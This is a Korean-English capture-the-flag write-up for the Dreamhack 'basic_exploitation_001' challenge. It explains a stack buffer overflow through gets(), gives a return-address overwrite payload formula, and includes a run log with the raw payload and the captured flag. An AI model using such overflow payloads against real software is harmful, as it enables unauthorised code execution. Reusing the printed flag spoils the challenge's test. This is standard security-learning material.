# Dreamhack: basic_exploitation_001 Write-up

## 1. Problem Overview
- **Category:** Pwnable
- **Difficulty:** Level 1
- **Tool:** IDA Free, VS Code (Python), Pwndbg
- **Description:** Return 주소를 조작해 flag 파일을 read하는문제 (RET Overwrite)

## 2. Static Analysis (정적 분석)

gets("%s", buf)와 같이 입력 길이를 제한하지 않는 함수에서 Stack Buffer Overflow가 발생함을 확인했습니다.
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[128]; // [esp+0h] [ebp-80h] BYREF

  initialize();
  gets(s);
  return 0;
}
```

프로그램 내에 직접적으로 플래그를 출력해 주는 함수(read_flag)의 주소를 pwndbg에서 추출했습니다.
```bash
pwndbg> info address read_flag
Symbol "read_flag" is at 0x80485b9 in a file compiled without debugging.
```

Stack Frame
- buf의 크기가 0x80 (128바이트)
- 32비트 환경이므로 스택 구조는 [buf] (128) + [SFP] (4) + [RET] (4) 순으로 구성됨.

## 3. Solution & Dynamic Analysis (동적 분석)

### RET Overwrite

함수가 종료될 때 EIP가 다음에 실행할 주소를 스택의 RET 영역에서 가져온다는 점을 이용합니다.

- 공식 (32비트 기준): Payload = Dummy Data (buf_size + SFP) + Target_Address Payload = b"A" * (buf_size + 4) + p32(target_address)
- 공식 (64비트 기준): Payload = Dummy Data (buf_size + SFP) + Target_Address Payload = b"A" * (buf_size + 8) + p64(target_address)

### Dynamic Analysis

분석 과정에서 아래 두 장의 사진을 넣으면 매우 좋습니다.

checksec 결과 사진: 바이너리에 적용된 보호 기법(NX, Canary 등)이 꺼져 있음을 보여줍니다.

stack 20 또는 tele 사진: 페이로드를 보낸 후, RET 지점이 정확히 타겟 주소로 덮여 있는 모습을 시각화합니다.


### Full Solver Code


## 4. Results
```bash
dreamhack@dongyeon:/mnt/f/dreamhack$ python3 t.py 
[+] Opening connection to host3.dreamhack.games on port 16904: Done
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb9\x85\x04\x08'
[*] Switching to interactive mode
DH{01ec06f5e1466e44f86a79444a7cd116}[*] Got EOF while reading in interactive
```













